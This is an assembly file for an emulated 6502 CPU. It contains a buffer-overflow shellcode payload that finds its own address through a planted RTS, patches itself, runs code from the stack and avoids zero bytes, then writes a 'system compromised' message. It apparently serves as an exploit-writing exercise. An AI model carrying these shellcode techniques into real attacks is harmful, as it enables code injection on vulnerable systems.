#include "cpu6502.asm"

#d "You are being hacked"  ; overflow the buffer

RTS_OPCODE = 0x60
JMP_IND_OPCODE = 0x6C
STA_ABS_X_OPCODE = 0x9D
LDA_ZPG_OPCODE = 0xA5
LDX_IMM_OPCODE = 0xA2
LDY_ABS_X_OPCODE = 0xBC

RTS_LOCATION = 0xFF60
STACK_SEQUENCE_START = 0xFF61
STACK_SEQUENCE_EXIT = 0xFF63

MSG_HI_ADDR = 0xFF
MSG_LO_ADDR = 0xFE

KNOWN_HI_ADDR = 0xFD
KNOWN_LO_ADDR = 0xFC

malicious_code:
    ; the code must determine where in RAM its been installed, so that it can
    ; calculate the proper address to refer to .msg by. Then, it must patch
    ; that address into the payload (self modifying code)

    ; in order to determine its location, we will jump into a subroutine and
    ; immediately return so that the PC is on the stack. We need to JSR to an
    ; abs addr that has an RTS in it. The payload cannot include the RTS as code
    ; because the abs addr resolved at payload assembly time will be incorrect

    ; so, the payload must install an RTS on the target system. RTS opcode is
    ; $60 will install it at $FF60 as an homage to the Apple II sysyem which
    ; also kept an RTS in this position so that other code could relocate itself.

    ; install the subroutine
    ldx #RTS_OPCODE
    stx RTS_LOCATION

    ; jump to routine and then examine stack to determine location
    jsr RTS_LOCATION

    ; at this point, 0x0100 + S contains PC hi and 0x0101 + S contains PC lo
    known_location:
        tsx  ; x = sp

    dex
    ldy 0x0101, x  ; y = [0x0101 + S]  (y = PC hi)

    dex
    lda 0x0101, x  ; a = [0x0101 + S - 1]  (a = PC lo)

    sty KNOWN_HI_ADDR
    sta KNOWN_LO_ADDR

    ; specifically, the location we've determined in A and Y points to the byte
    ; immediately before the TSX instruction.

    ; how many bytes are between that location and the start of that message?
    ; need to determine this via the payload's binary. its a constant that can
    ; be hardcoded.
    ; from inspection, it seems to be 31 bytes.

    ; so need to add 31 to PC lo, then add carry to PC hi
    clc
    adc #MESSAGE_OFFSET  ; A = A + msg_offset

    pha  ; back it up on the stack
    tya  ; A = Y
    adc #1  ; A = A + 1 + Carry
    tay  ; Y = A
    dey  ; remove the 1 (needed that bc can't have 0 byte in payload)

    pla  ; pull A back from stack

    ; So now A has the low byte of .msg and Y has the high byte
    sty MSG_HI_ADDR
    sta MSG_LO_ADDR

    ; now, patch these values into the correct locations

    ; in order to jump to the beginning of an instruction sequence
    ; like this on the stack, will first need to add 1 to SP.
    ; then move SP into the PC. Need to put the SP into some fixed
    ; location, and then do an indirect jump to it.
    ; so need 2 bytes in a fixed location.

    ; to exit this sequence off of the stack, need to jump to the
    ; label "write_message". So need to compute its address, store
    ; it into some fixed location, and then do an indirect jump to it.
    ; so need 2 bytes in a fixed location.

    ; so first, need to compute the address of "write_message" and store
    ; it in the vector.

    ; Compute and store lower half of vector
    lda KNOWN_LO_ADDR
    clc
    adc #LABEL_OFFSET  ; A = A + LABEL_OFFSET
    sta STACK_SEQUENCE_EXIT

    ; Compute and store upper half of vector
    lda KNOWN_HI_ADDR
    adc #1
    tay
    dey
    sty STACK_SEQUENCE_EXIT + 1

    ; Next, need to put this instruction stream on the stack
    ; need to put it on backwards

    ; --------------------------------------

    ; ldx #PATCH_LO_OFFSET
    ; lda MSG_HI_ADDR
    ; sta <known_location>, x

    ; ldx #PATCH_HI_OFFSET
    ; lda MSG_LO_ADDR
    ; sta <known_location>, x

    ; jmp (STACK_SEQUENCE_EXIT)

    ; --------------------------------------

    ; 3 bytes: jmp (STACK_SEQUENCE_EXIT)
    lda STACK_SEQUENCE_EXIT + 1
    pha

    lda STACK_SEQUENCE_EXIT
    pha

    ; lda #JMP_IND_OPCODE
    lda #0x4C  ; JMP_ABS_OPCODE
    pha

    ; 3 bytes: sta <known_location>, x
    lda KNOWN_HI_ADDR
    pha

    lda KNOWN_LO_ADDR
    pha

    lda #STA_ABS_X_OPCODE
    pha

    ; 2 bytes: lda MSG_LO_ADDR
    lda #MSG_HI_ADDR
    pha

    lda #LDA_ZPG_OPCODE
    pha

    ; 2 bytes: ldx #PATCH_HI_OFFSET
    lda #PATCH_HI_OFFSET
    pha

    lda #LDX_IMM_OPCODE
    pha

    ; 3 bytes: sta <known_location>, x
    lda KNOWN_HI_ADDR
    pha

    lda KNOWN_LO_ADDR
    pha

    lda #STA_ABS_X_OPCODE
    pha

    ; 2 bytes: lda MSG_HI_ADDR
    lda #MSG_LO_ADDR
    pha

    lda #LDA_ZPG_OPCODE
    pha

    ; 2 bytes: ldx #PATCH_LO_OFFSET
    lda #PATCH_LO_OFFSET
    pha

    lda #LDX_IMM_OPCODE
    pha

    ; -----------------------
    tsx  ; grab the stack pointer
    inx  ; increment by 1. x now points to beginning of program on stack

    stx STACK_SEQUENCE_START
    ldx #1
    stx STACK_SEQUENCE_START + 1

    jmp (STACK_SEQUENCE_START)

    write_message:

        ; get a 0 into x
        lda #1  ; a = 1
        sec
        sbc #1  ; a -= 1 (a = 0)
        tax     ; x = a  (x = 0)

        loop:
            cpx #message_len
            beq done

            patch_location:
                #d LDY_ABS_X_OPCODE, 0xFF, 0xFF

            sty 1, x

            inx
            clc
            bcc loop

    done:
        hlt

message:
    #d "The system has been compromised."
message_len = $ - message

LABEL_OFFSET = write_message - known_location + 1
MESSAGE_OFFSET = message - known_location + 1
PATCH_HI_OFFSET = patch_location - known_location + 3
PATCH_LO_OFFSET = patch_location - known_location + 2

#d "\0"
